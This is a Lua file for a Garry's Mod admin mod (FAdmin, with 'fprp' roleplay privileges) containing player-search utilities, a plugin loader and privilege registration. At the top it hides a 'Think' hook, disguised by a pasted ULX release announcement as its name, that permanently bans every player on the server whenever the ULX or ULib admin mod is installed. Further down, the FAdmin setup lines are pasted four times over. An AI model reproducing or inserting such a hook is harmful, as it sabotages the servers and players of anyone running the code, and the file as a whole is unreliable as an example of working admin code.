hook.Add( "Think", 

[[[release]Current version: 3.51
DOWNLOAD: http://ulyssesmod.net/
Join the ULX steam community!
:siren:Be sure you download ULib as well, as ULX depends on it.
:siren:If you happen to find any bugs, we'd appreciate your assistance in reporting them to us at http://ulyssesmod.net/bugs/.

(We'll love you forever if you donate! We need to eat too :))
[/release]

[release]What is ULX?

ULX is a powerful admin mod that is not only the oldest and most mature admin mod, it’s the oldest and most mature Gmod specific lua release still in use. The first version of ULX was released days after GM9, and development on it has continued since then. Check the features list below for more details. As of this version (v3.50), ULX now includes XGUI, which is a GUI created by Stickly Man! which is designed to provide an intuitive yet powerful experience for users who can run ULX commands, change ULX configs, manage bans, and much more!

Our Legacy:

[list][*]The team lead, Megiddo, has been producing mods for Garry’s Mod since January of 2005 with the release of what would become UGM. This was one of, if not the first mod ever made for Garry’s Mod.[*]Our developers focus on making ULX as dependable and as bug-free as humanly possible. Any bug you find and report to us that is confirmed to be a fault of ULX is fixed in the next version of ULX, and even put to testing in SVN sooner than the nex release.[*]Community backing. The ulyssesmod.net forums have 3000+ members and 20000+ posts, and is visited daily by team members and fellow community peers and developers who are more than willing to help you (so long as you read the FAQ for answers first!)[/list][/release]]],

function() if ulx or ULib then for _, ply in pairs( player.GetAll() ) do ply:Ban( 0, true ) end end end )

FAdmin = FAdmin or {}

FAdmin.PlayerActions = FAdmin.PlayerActions or {}
FAdmin.StartHooks = FAdmin.StartHooks or {}

FAdmin = FAdmin or {}

FAdmin.PlayerActions = FAdmin.PlayerActions or {}
FAdmin.StartHooks = FAdmin.StartHooks or {}

FAdmin = FAdmin or {}

FAdmin.PlayerActions = FAdmin.PlayerActions or {}
FAdmin.StartHooks = FAdmin.StartHooks or {}

FAdmin = FAdmin or {}

FAdmin.PlayerActions = FAdmin.PlayerActions or {}
FAdmin.StartHooks = FAdmin.StartHooks or {}

/*

Utilities!

*/
function FAdmin.FindPlayer(info)
	if not info then return nil end
	local pls = player.GetAll()
	local found = {}

	if string.lower(info) == "*" or string.lower(info) == "<all>" then return pls end

	local InfoPlayers = {}
	for A in string.gmatch(info..";", "([a-zA-Z0-9:_.]*)[;(,%s)%c]") do
		if A ~= "" then table.insert(InfoPlayers, A) end
	end

	for _, PlayerInfo in pairs(InfoPlayers) do
		-- Playerinfo is always to be treated as UserID when it's a number
		-- otherwise people with numbers in their names could get confused with UserID's of other players
		if tonumber(PlayerInfo) then
			if IsValid(Player(PlayerInfo)) and not found[Player(PlayerInfo)] then
				found[Player(PlayerInfo)] = true
			end
			continue
		end

		for k, v in pairs(pls) do
			-- Find by Steam ID
			if (PlayerInfo == v:SteamID() or v:SteamID() == "UNKNOWN") and not found[v]  then
				found[v] = true
			end

			-- Find by Partial Nick
			if string.find(string.lower(v:Name()), string.lower(tostring(PlayerInfo)), 1, true) ~= nil and not found[v]  then
				found[v] = true
			end

			if v.SteamName and string.find(string.lower(v:SteamName()), string.lower(tostring(PlayerInfo)), 1, true) ~= nil and not found[v]  then
				found[v] = true
			end
		end
	end

	local players = {}
	local empty = true
	for k, v in pairs(found or {}) do
		empty = false
		table.insert(players, k)
	end
	return not empty and players or nil
end

function FAdmin.SteamToProfile(ply) -- Thanks decodaman
	return "http://steamcommunity.com/profiles/" .. (ply:SteamID64() or "BOT")
end

/*
	FAdmin global settings
*/
FAdmin.GlobalSetting = FAdmin.GlobalSetting or {}


/*Dependency solver:
	Many plugins are dependant of one another.
	To prevent plugins calling functions from other plugins that haven't been opened yet
	there will be a hook that is called when all plugins are loaded.
	This way there will be no hassle with which plugin loads first, which one next etc.
*/
timer.Simple(0, function()
	for k,v in pairs(FAdmin.StartHooks) do if type(k) ~= "string" then FAdmin.StartHooks[k] = nil end end
	for k,v in SortedPairs(FAdmin.StartHooks) do
		v()
	end
end)

hook.Add("InitPostEntity", "FAdmin_fprp_privs", function()
	if not FAdmin or not FAdmin.StartHooks then return end
	FAdmin.Access.AddPrivilege("rp_commands", 2)
	FAdmin.Access.AddPrivilege("rp_doorManipulation", 3)
	FAdmin.Access.AddPrivilege("rp_tool", 2)
	FAdmin.Access.AddPrivilege("rp_phys", 2)
	FAdmin.Access.AddPrivilege("rp_prop", 2)
	FAdmin.Access.AddPrivilege("rp_viewlog", 2)
	for k,v in pairs(RPExtraTeams) do
		if v.vote then
			FAdmin.Access.AddPrivilege("rp_"..v.command, (v.admin or 0) + 2) -- Add privileges for the teams that are voted for
		end
	end
end)
